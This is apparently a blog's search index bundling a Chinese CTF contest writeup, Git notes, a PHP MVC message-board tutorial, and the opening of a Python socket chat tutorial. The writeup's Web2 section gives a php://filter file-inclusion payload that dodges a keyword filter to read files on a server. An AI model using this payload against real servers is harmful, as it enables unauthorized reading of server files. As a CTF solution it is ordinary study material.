<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>安恒月赛2020元旦场Writeup</title>
    <url>/2020/01/01/AnhengMonthMatch2020-1-Writeup/</url>
    <content><![CDATA[<p>正在复习密码学，突然发现今天有月赛了…于是做了一下，很简单的一次题目。。</p>
<p><br></p>
<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><p>进入后是一个JS的游戏，在<code>index.js</code>里修改一下<code>destroyed</code>的增加设置大一些，如下：</p>
<p><img src="/2020/01/01/AnhengMonthMatch2020-1-Writeup/20200101182915730.png" alt="在这里插入图片描述"></p>
<p>然后随便玩一下就能得到flag了：</p>
<p><img src="/2020/01/01/AnhengMonthMatch2020-1-Writeup/20200101183118827.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><p>题目名字叫地图，进入后发现实际上没什么功能，只有<code>index.php</code>一个页面，</p>
<p><img src="/2020/01/01/AnhengMonthMatch2020-1-Writeup/20200101183447834.png" alt="在这里插入图片描述"><br>点击发现url中存在<code>page=index</code>，于是尝试文件包含，正常的base64编码的payload会返回<code>not base</code>，应该是过滤了base，使用rot13编码读取，先读<code>index.php</code>可以发现flag在根目录，payload如下：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">/<span class="built_in">index</span>.php/?page=php://<span class="built_in">filter</span>/<span class="keyword">read</span>=<span class="built_in">string</span>.<span class="built_in">toupper</span>|<span class="built_in">string</span>.rot13/resource=/flag</span><br></pre></td></tr></table></figure>
<p><img src="/2020/01/01/AnhengMonthMatch2020-1-Writeup/20200101183717300.png" alt="在这里插入图片描述"></p>
<p>rot13解码得到flag。</p>
<p><br></p>
<h1 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h1><p>题目如下给了3个png和一个加密脚本如下：</p>
<p><img src="/2020/01/01/AnhengMonthMatch2020-1-Writeup/20200101185338363.png" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> key</span><br><span class="line"></span><br><span class="line">ki= cycle(key)</span><br><span class="line"></span><br><span class="line">fr1 = open(<span class="string">"flag.png"</span>,<span class="string">"rb"</span>)</span><br><span class="line">fr2 = open(<span class="string">"fflag.png"</span>,<span class="string">"rb"</span>)</span><br><span class="line">fw1 = open(<span class="string">"flag_e.png"</span>,<span class="string">"wb"</span>)</span><br><span class="line">fw2 = open(<span class="string">"fflag_e.png"</span>,<span class="string">"wb"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now <span class="keyword">in</span> fr1:</span><br><span class="line">    <span class="keyword">for</span> nowByte <span class="keyword">in</span> now:</span><br><span class="line">        newByte = nowByte ^ ord(next(ki))</span><br><span class="line">        fw1.write(bytes([newByte]))</span><br><span class="line">fr1.close()</span><br><span class="line">fw1.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now <span class="keyword">in</span> fr2:</span><br><span class="line">    <span class="keyword">for</span> nowByte <span class="keyword">in</span> now:</span><br><span class="line">        newByte = nowByte ^ ord(next(ki))</span><br><span class="line">        fw2.write(bytes([newByte]))</span><br><span class="line">fr2.close()</span><br><span class="line">fw2.close()</span><br></pre></td></tr></table></figure>
<p>其中fflag.png是打了马赛克的flag，看一下代码，flag.png加密得到flag_e.png，fflag.png加密得到fflag_e.png，但是加密用的ki不知道。简单分析一下，加密过程就是循环用ki每一位的ascii的与图片进行异或，且两次的加密过程一样，那么思路就清楚了。</p>
<p>我们有fflag.png和加密后的fflag_e.png，前者相当于明文m，后者相当于密文c，加密过程为c=m⊕k，那么现在已知m和c，容易得到k=m⊕c<br>有如下脚本计算ki的ascii：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fr_m = open(<span class="string">"fflag.png"</span>, <span class="string">"rb"</span>)</span><br><span class="line">fr_c = open(<span class="string">"fflag_e.png"</span>, <span class="string">"rb"</span>)</span><br><span class="line">m = []</span><br><span class="line">c = []</span><br><span class="line">ki = []</span><br><span class="line"><span class="keyword">for</span> now <span class="keyword">in</span> fr_m:</span><br><span class="line">    <span class="keyword">for</span> nowByte <span class="keyword">in</span> now:</span><br><span class="line">        m.append(nowByte)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> now <span class="keyword">in</span> fr_c:</span><br><span class="line">    <span class="keyword">for</span> nowByte <span class="keyword">in</span> now:</span><br><span class="line">        c.append(nowByte)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line">    ki.append(m[i] ^ c[i])</span><br><span class="line"></span><br><span class="line">fr_m.close()</span><br><span class="line">fr_c.close()</span><br><span class="line">print(ki)</span><br></pre></td></tr></table></figure>
<p>很容易得到ki如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[<span class="number">65</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">101</span>]</span><br></pre></td></tr></table></figure>
<p>于是对flag_e.png进行解密如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag_r = open(<span class="string">"flag_e.png"</span>,<span class="string">"rb"</span>)</span><br><span class="line">flag_w = open(<span class="string">"flag.png"</span>,<span class="string">"wb"</span>)</span><br><span class="line">ki = [<span class="number">65</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">101</span>]*<span class="number">500</span></span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> now <span class="keyword">in</span> flag_r:</span><br><span class="line">    <span class="keyword">for</span> nowByte <span class="keyword">in</span> now:</span><br><span class="line">        c.append(nowByte)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">    newByte = c[i] ^ ki[i]</span><br><span class="line">    flag_w.write(bytes([newByte]))</span><br><span class="line"></span><br><span class="line">flag_r.close()</span><br><span class="line">flag_w.close()</span><br></pre></td></tr></table></figure>
<p>运行得到flag.png:</p>
<p><img src="/2020/01/01/AnhengMonthMatch2020-1-Writeup/20200101190909765.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h1><p>一道RSA的题目，给的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = random.randint(<span class="number">2</span>, <span class="number">10</span>)</span><br><span class="line">e =<span class="number">65537</span></span><br><span class="line">n = p ** r</span><br><span class="line">m=flag</span><br><span class="line"><span class="keyword">assert</span>(int(m.encode(<span class="string">'hex'</span>), <span class="number">16</span>) &lt; n)</span><br><span class="line">c = pow(int(m.encode(<span class="string">'hex'</span>), <span class="number">16</span>),e,n) </span><br><span class="line">c=long_to_bytes(c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c =\n'</span>, c.encode(<span class="string">'base64'</span>),n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c =</span></span><br><span class="line"><span class="string">apxy3z3DgGnzaEedcUy3A49wAsqyyn9sqx6eYZL5iDrCq0Wjs8BOY2Ofza5wuaFigm32PVpO5jpu</span></span><br><span class="line"><span class="string">Dgw9b6oX8KM2ZB9/dDmwQc7JKnAKhCQrIc1v9qt7iQbnTK0DTQj/xvQkz/IBeSjoWBmHOx4s0tDx</span></span><br><span class="line"><span class="string">ZRAjOPui5wwAywNM3ynULEPczv+xN2v+6HBeoS2YuyfF5mq/pIAMPwZs+QpkuwxSbNQ6xPNP9Ox1</span></span><br><span class="line"><span class="string">IeKz/41F7/D2fDsGB5CcFdAiQq+r95BhVeGzeaiQBpzwAXAPKIyO+fP6/M9XmpSJwjaMSiAUnksp</span></span><br><span class="line"><span class="string">9KfVOXgEG9Z0FmxP6rgqPl0vU+rVeJ2RsTUYCSP8Vy+PD3PGwDDdUtNzvcEXKr2BKiNoOUxprBAt</span></span><br><span class="line"><span class="string">yvcsmGqRLgDl1ZVgzSZ1U4MAmJ9x42mIU0XvolqaOCJZzaym1kJoBlw7/7+Nej4owEtan/c3TIkD</span></span><br><span class="line"><span class="string">kr/gCenUD/8MSlvnfTUMGdQLkSht2BZiuiHxVVRVzY5ETG6v+w9AtDMC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p>给了n和密文c，可以看到n是用p的r次幂，r为2~10的随机数，分解一下n试试，如下：</p>
<p><img src="/2020/01/01/AnhengMonthMatch2020-1-Writeup/20200101184952357.png" alt="在这里插入图片描述"></p>
<p>发现可以成功分解，并且知道r为3，这样就很容易求出d了，解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number"></span></span><br><span class="line">e =<span class="number">65537</span></span><br><span class="line">c =<span class="string">""</span></span><br><span class="line">p = <span class="number"></span></span><br><span class="line">r = <span class="number">3</span></span><br><span class="line">phin = pow(p, <span class="number">3</span>) - pow(p, <span class="number">2</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line">c = bytes_to_long(base64.b64decode(c))</span><br><span class="line">m = pow(int(c), d, n)</span><br><span class="line">flag = libnum.n2s(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>运行得到flag：</p>
<p><img src="/2020/01/01/AnhengMonthMatch2020-1-Writeup/20200101185201926.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习小结</title>
    <url>/2019/07/14/Git_Learning/</url>
    <content><![CDATA[<p>学习自<a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/896043488029600</a><br><br></p>
<h3 id="一、创建版本库"><a href="#一、创建版本库" class="headerlink" title="一、创建版本库"></a>一、创建版本库</h3><p>（1） <code>git init</code> 初始化一个Git仓库</p>
<p>（2）添加文件到Git仓库，分两步：<br><code>git add &lt;file&gt;</code> 将工作区中修改提交到暂存区，可反复多次使用，添加多个文件<br><code>git commit -m &lt;message&gt;</code> 将在暂存区中修改提交到分支</p>
<p><br></p>
<h3 id="二、时光穿梭机"><a href="#二、时光穿梭机" class="headerlink" title="二、时光穿梭机"></a>二、时光穿梭机</h3><p><code>git status</code> 可以查看工作区的状态</p>
<p>如果<code>git status</code>发现有文件被修改过，用<code>git diff</code>可以查看修改内容。</p>
<p>（1）版本回退</p>
<ul>
<li><code>HEAD</code>指向的版本就是当前版本，<code>git reset --hard HEAD^</code>即回退到上一版本</li>
<li><code>git reset --hard commit_id</code> 可以回退到历史中任何一个版本，只要知道其版本号</li>
<li><p><code>git log</code> 可以查看提交历史，以便确定要回退到哪个版本。</p>
</li>
<li><p><code>git reflog</code> 可以查看命令历史，以便确定要回到未来的哪个版本</p>
</li>
</ul>
<p>（2）工作区和暂存区<br><img src="/2019/07/14/Git_Learning/Git学习小结/1.jpg" alt="在这里插入图片描述"><br>把文件往Git版本库里添加的时候，是分两步执行的：</p>
<p>第一步是用<code>git add</code>把文件添加进去，实际上就是把文件修改添加到暂存区；</p>
<p>第二步是用<code>git commit</code>提交更改，实际上就是把暂存区的所有内容提交到当前分支。</p>
<p>因为我们创建Git版本库时，Git自动为我们创建了唯一一个<code>master</code>分支，所以，现在，<code>git commit</code>就是往<code>master</code>分支上提交更改。</p>
<p>可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。</p>
<p>（3）管理修改<br>第一次修改 -&gt; <code>git add</code> -&gt; 第二次修改 -&gt; <code>git commit</code><br>上述过程只有第一次修改会被提交。</p>
<p>第一次修改 -&gt; <code>git add</code> -&gt; 第二次修改 -&gt; <code>git add</code> -&gt; <code>git commit</code><br>两次修改均被提交。</p>
<p>（4）撤销修改</p>
<ul>
<li><p>当改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令<code>git checkout -- file</code></p>
</li>
<li><p>当不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令<code>git reset HEAD &lt;file&gt;</code>，就回到了上述过程，第二步按上述过程操作，即<code>git checkout -- file</code>。</p>
</li>
<li><p>已经提交了不合适的修改到版本库时，想要撤销本次提交，则需要进行<strong>版本回退</strong>，不过前提是没有推送到远程</p>
</li>
</ul>
<p>（5）删除文件</p>
<p>当在工作区中删除了一个文件后，<br><code>git rm &lt;filename&gt;</code> 可以从版本库中将该文件删除</p>
<p><code>git checkout -- &lt;filename&gt;</code> 用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以还原</p>
<p><br></p>
<h3 id="三、远程仓库"><a href="#三、远程仓库" class="headerlink" title="三、远程仓库"></a>三、远程仓库</h3><ul>
<li><p>要关联一个远程库，使用命令<code>git remote add origin git@server-name:path/repo-name.git</code></p>
</li>
<li><p>关联后，使用命令<code>git push -u origin master</code>第一次推送master分支的所有内容</p>
</li>
<li><p>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改</p>
</li>
<li><p>要克隆一个仓库，首先必须知道仓库的地址，然后使用<code>git clone</code>命令克隆。</p>
</li>
</ul>
<p><br></p>
<h3 id="四、分支管理"><a href="#四、分支管理" class="headerlink" title="四、分支管理"></a>四、分支管理</h3><p>（1）创建与合并分支</p>
<p>查看分支：<code>git branch</code></p>
<p>创建分支：<code>git branch &lt;name&gt;</code></p>
<p>切换分支：<code>git checkout &lt;name&gt;</code></p>
<p>创建+切换分支：<code>git checkout -b &lt;name&gt;</code></p>
<p>合并某分支到当前分支：<code>git merge &lt;name&gt;</code></p>
<p>删除分支：<code>git branch -d &lt;name&gt;</code></p>
<p>（2）解决冲突</p>
<p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p>
<p>解决冲突就是把Git合并失败的文件手动编辑为我们希望的内容，再提交。</p>
<p>用<code>git log --graph</code>命令可以看到分支合并图。(参数<code>--graph --pretty=oneline --abbrev-commit</code>可以更美观)</p>
<p>（3）分支管理策略</p>
<p>实际开发中，我们应该按照几个基本原则进行分支管理：<br>① 首先，<code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p>
<p>② 干活都在<code>dev</code>分支上，也就是说，<code>dev</code>分支是不稳定的，到某个时候，比如1.0版本发布时，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本；</p>
<p>③ 每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。<br><img src="/2019/07/14/Git_Learning/Git学习小结/2.png" alt="在这里插入图片描述"><br>合并分支时，加上<code>--no-ff</code>参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而默认的<code>fast forward</code>合并就看不出来曾经做过合并。</p>
<p>（4）Bug分支</p>
<p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除</p>
<p>当手头工作没有完成时，可以先暂存当前工作现场，修复完后在恢复：</p>
<p><code>git stash</code> 可以暂存当前的工作现场</p>
<p><code>git stash list</code> 可以查看暂存的工作现场</p>
<p><code>git stash apply</code> 恢复现场，但是恢复后，<code>stash</code>内容并不删除，需要用<code>git stash drop</code>来删除；</p>
<p><code>git stash pop</code> 恢复的同时把<code>stash</code>内容也删了</p>
<p>（5）Feature分支</p>
<p>开发一个新feature，最好新建一个分支；</p>
<p>如果要丢弃一个没有被合并过的分支，可以通过<code>git branch -D &lt;name&gt;</code>强行删除。</p>
<p>（6）多人协作</p>
<ul>
<li><p>查看远程库信息, 使用<code>git remote -v</code>；</p>
</li>
<li><p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>
</li>
<li><p>从本地推送分支，使用<code>git push origin branch-name</code>，如果推送失败，先用<code>git pull</code>抓取远程的新提交；</p>
</li>
<li><p>在本地创建和远程分支对应的分支，使用<code>git checkout -b branch-name origin/branch-name</code>，本地和远程分支的名称最好一致；</p>
</li>
<li><p>建立本地分支和远程分支的关联，使用<code>git branch --set-upstream branch-name origin/branch-name</code>；</p>
</li>
<li><p>从远程抓取分支，使用<code>git pull</code>，如果有冲突，要先处理冲突。</p>
</li>
</ul>
<p><strong>多人协作的工作模式通常是这样：</strong></p>
<ol>
<li>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改；</li>
<li><p>如果推送失败，则因为远程分支比你的本地更新，需要先用<code>git pull</code>试图合并；</p>
</li>
<li><p>如果合并有冲突，则解决冲突，并在本地提交；</p>
</li>
<li><p>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送就能成功</p>
</li>
</ol>
<p>如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。</p>
<p>（7）Rebase</p>
<ul>
<li><p>rebase操作可以把本地未push的分叉提交历史整理成直线；</p>
</li>
<li><p>rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。</p>
</li>
</ul>
<p><br>  </p>
<h3 id="五、标签管理"><a href="#五、标签管理" class="headerlink" title="五、标签管理"></a>五、标签管理</h3><p>（1）创建标签</p>
<ul>
<li><p><code>git tag &lt;tagname&gt;</code> 用于新建一个标签，默认为<code>HEAD</code>，也可以指定一个<code>commit id</code></p>
</li>
<li><p><code>git tag -a &lt;tagname&gt; -m &quot;blablabla...&quot;</code> 可以指定标签信息；</p>
</li>
<li><p><code>git tag</code> 可以查看所有标签。</p>
</li>
</ul>
<p>（2）操作标签</p>
<ul>
<li><p><code>git push origin &lt;tagname&gt;</code> 可以推送一个本地标签</p>
</li>
<li><p><code>git push origin --tags</code>可以推送全部未推送过的本地标签</p>
</li>
<li><p><code>git tag -d &lt;tagname&gt;</code>可以删除一个本地标签</p>
</li>
<li><p><code>git push origin :refs/tags/&lt;tagname&gt;</code>可以删除一个远程标签</p>
</li>
</ul>
<p><br><br><br></p>
<p>最后附一张git命令表：<br><img src="/2019/07/14/Git_Learning/Git学习小结/3.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Study Notes</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>MVC架构实现简易留言管理系统</title>
    <url>/2019/07/28/MVC_Simple_Message_Board/</url>
    <content><![CDATA[<h4 id="0x01-总体设计"><a href="#0x01-总体设计" class="headerlink" title="0x01 总体设计"></a>0x01 总体设计</h4><p>留言模块主要包括以下几个子模块：</p>
<ul>
<li>模型模块（Model）：模型类中封装好用户操作数据库的各种方法，供控制器调用。</li>
<li>视图模块（View）:Web视图页面收集用户留言。</li>
<li>控制器模块（Controller）：控制器处理Web视图页面收集的数据。</li>
</ul>
<p><br></p>
<h4 id="0x02-详细设计"><a href="#0x02-详细设计" class="headerlink" title="0x02 详细设计"></a>0x02 详细设计</h4><h6 id="（1）查看留言记录"><a href="#（1）查看留言记录" class="headerlink" title="（1）查看留言记录"></a>（1）查看留言记录</h6><ul>
<li>在控制器的selete()方法中，调用模型类中封装的getSelete()方法查询数据表中所有的数据，并显示到前端。</li>
<li>在Web页面中循环遍历返回的索引数组，即可显示留言列表。</li>
</ul>
<h6 id="（2）添加留言记录"><a href="#（2）添加留言记录" class="headerlink" title="（2）添加留言记录"></a>（2）添加留言记录</h6><ul>
<li>在前端页面的form表单中获取用户输入的数据。</li>
<li>在控制器的add()方法中，调用模型类中封装的getInsert()方法向数据表中添加数据。</li>
<li>前端页面跳转到留言列表中。</li>
</ul>
<h6 id="（3）修改留言记录"><a href="#（3）修改留言记录" class="headerlink" title="（3）修改留言记录"></a>（3）修改留言记录</h6><ul>
<li>当要修改数据时，先查找要修改的内容，把查找到的数据放到表单中。</li>
<li>在控制器的update()方法中，调用模型类中封装的getUpdate()方法对留言数据进行修改。</li>
</ul>
<h6 id="（4）删除留言记录"><a href="#（4）删除留言记录" class="headerlink" title="（4）删除留言记录"></a>（4）删除留言记录</h6><ul>
<li>在Web页面点击“删除”，进入控制器的delete()方法。</li>
<li>在控制器的delete()方法中，调用模型类中封装的getDelete()方法，删除指定的留言数据。</li>
<li>删除成功后页面跳转到留言列表页。</li>
</ul>
<p><br></p>
<h4 id="0x03-MVC目录结构"><a href="#0x03-MVC目录结构" class="headerlink" title="0x03 MVC目录结构"></a>0x03 MVC目录结构</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">MVC</span><br><span class="line">|-- controller   <span class="comment">//控制器目录</span></span><br><span class="line">|-- model        <span class="comment">//模型目录</span></span><br><span class="line">|-- <span class="keyword">view</span>         <span class="comment">//视图目录</span></span><br><span class="line">|-- core         <span class="comment">//核心目录</span></span><br><span class="line">||--- MVCFunction.<span class="keyword">class</span>.php  <span class="comment">//核心文件</span></span><br><span class="line">||--- <span class="keyword">DB</span>.<span class="keyword">class</span>.php           <span class="comment">//操作数据库核心文件</span></span><br><span class="line">|-- index.php    <span class="comment">//入口文件</span></span><br><span class="line">|-- <span class="keyword">conf</span>.php     <span class="comment">//连接数据库配置文件</span></span><br></pre></td></tr></table></figure>
<p>  <br></p>
<h4 id="0x04-数据表设计"><a href="#0x04-数据表设计" class="headerlink" title="0x04 数据表设计"></a>0x04 数据表设计</h4><p>创建数据表messages的sql代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`messages`</span>(</span><br><span class="line">	<span class="string">`id`</span> <span class="built_in">INT</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">	<span class="string">`name`</span> <span class="built_in">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">	<span class="string">`email`</span> <span class="built_in">VARCHAR</span>(<span class="number">35</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">	<span class="string">`content`</span> <span class="built_in">VARCHAR</span>(<span class="number">200</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">	<span class="string">`message_time`</span> DATETIME <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">	PRIMARY <span class="keyword">KEY</span>(<span class="string">`id`</span>)</span><br><span class="line">)<span class="keyword">ENGINE</span>=MyISAM <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure>
<p>结构如下：</p>
<p><img src="/2019/07/28/MVC_Simple_Message_Board/MVC架构实现简易留言管理系统/20190728144058875.png" alt="在这里插入图片描述"></p>
<p>  <br></p>
<h4 id="0x05-MVC配置部署"><a href="#0x05-MVC配置部署" class="headerlink" title="0x05 MVC配置部署"></a>0x05 MVC配置部署</h4><p>（1）先对数据库连接文件进行配置，即conf.php文件：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    define(<span class="string">'DB_HOST'</span>,<span class="string">'localhost'</span>);</span><br><span class="line">    define(<span class="string">'DB_USER'</span>,<span class="string">'root'</span>);</span><br><span class="line">    define(<span class="string">'DB_PASS'</span>,<span class="string">''</span>);   <span class="comment">//your password</span></span><br><span class="line">    define(<span class="string">'DB_NAME'</span>,<span class="string">'messages_board'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>（2）控制器部署</p>
<p>在controller控制器目录下创建MessageController.class.php控制器文件，并在其中创建MessageController控制器类，代码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">MessageController</span></span>&#123;</span><br><span class="line">		<span class="comment">//code...</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>（3）模型部署</p>
<p>在model模型目录下创建MessageModel.class.php控制器文件，并在其中创建MessageModel模型类，代码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">MessageModel</span></span>&#123;</span><br><span class="line">		<span class="comment">//code...</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>（4）视图部署</p>
<p>在view视图目录下创建MessageView.class.php控制器文件，并在其中创建MessageView视图类，代码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">MessageView</span></span>&#123;</span><br><span class="line">		<span class="comment">//code...</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>实现上述部署后，当前目录状态如下：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">MVC</span><br><span class="line">|-- controller   <span class="comment">//控制器目录</span></span><br><span class="line">||--- MessageController.<span class="keyword">class</span>.php	<span class="comment">//留言板控制器</span></span><br><span class="line">|-- model        <span class="comment">//模型目录</span></span><br><span class="line">||--- MessageModel.<span class="keyword">class</span>.php		<span class="comment">//留言板模型</span></span><br><span class="line">|-- <span class="keyword">view</span>         <span class="comment">//视图目录</span></span><br><span class="line">||--- MessageView.<span class="keyword">class</span>.php		<span class="comment">//留言板视图</span></span><br><span class="line">|-- core         <span class="comment">//核心目录</span></span><br><span class="line">||--- MVCFunction.<span class="keyword">class</span>.php  <span class="comment">//核心文件</span></span><br><span class="line">||--- <span class="keyword">DB</span>.<span class="keyword">class</span>.php           <span class="comment">//操作数据库核心文件</span></span><br><span class="line">|-- index.php    <span class="comment">//入口文件</span></span><br><span class="line">|-- <span class="keyword">conf</span>.php     <span class="comment">//连接数据库配置文件</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h4 id="0x06-代码实现"><a href="#0x06-代码实现" class="headerlink" title="0x06 代码实现"></a>0x06 代码实现</h4><p>完整代码已上传到github：<a href="https://github.com/LetheSec/MVC_MessageBoard" target="_blank" rel="noopener">https://github.com/LetheSec/MVC_MessageBoard</a></p>
<p><br></p>
<h4 id="0x07-结果展示"><a href="#0x07-结果展示" class="headerlink" title="0x07 结果展示"></a>0x07 结果展示</h4><p><strong>初始页面：</strong><br><img src="/2019/07/28/MVC_Simple_Message_Board/MVC架构实现简易留言管理系统/20190728174050237.png" alt="在这里插入图片描述"></p>
<p><strong>点击添加留言即可开始留言：</strong><br><img src="/2019/07/28/MVC_Simple_Message_Board/MVC架构实现简易留言管理系统/20190728174115298.png" alt="在这里插入图片描述"></p>
<p>可对留言进行修改或删除：<br><img src="/2019/07/28/MVC_Simple_Message_Board/MVC架构实现简易留言管理系统/20190728174203383.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Python多线程socket模拟C/S多人聊天室</title>
    <url>/2019/07/19/Python%E5%A4%9A%E7%BA%BF%E7%A8%8Bsocket%E6%A8%A1%E6%8B%9FC-S%E5%A4%9A%E4%BA%BA%E8%81%8A%E5%A4%A9%E5%AE%A4/</url>
    <content><![CDATA[<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><h5 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h5><p>（1）在<strong>服务端</strong>，由于 socket 的 <code>recv()</code> 方法在成功读取到数据之前，线程会被阻塞，程序无法继续执行，因此需要为每个 socket 单独启动一个线程，每个线程负责与一个客户端进行通信。</p>
<p>（2）在<strong>客户端</strong>，从服务段读取数据的线程同样也会被阻塞，因此也需要单独启动一个线程，专门负责从服务端读取数据。</p>
<h5 id="2-实现"><a href="#2-实现" class="headerlink" title="2. 实现"></a>2. 实现</h5><h6 id="（1）服务端"><a href="#（1）服务端" class="headerlink" title="（1）服务端"></a>（1）服务端</h6><ul>
<li>包含多个线程，每个socket对用一个线程，负责从socket中读取数据，打印出来并广播给所有建立通信的客户端，因此需要一个 <strong>socket_list</strong> 来保存所有建立连接的客户端。</li>
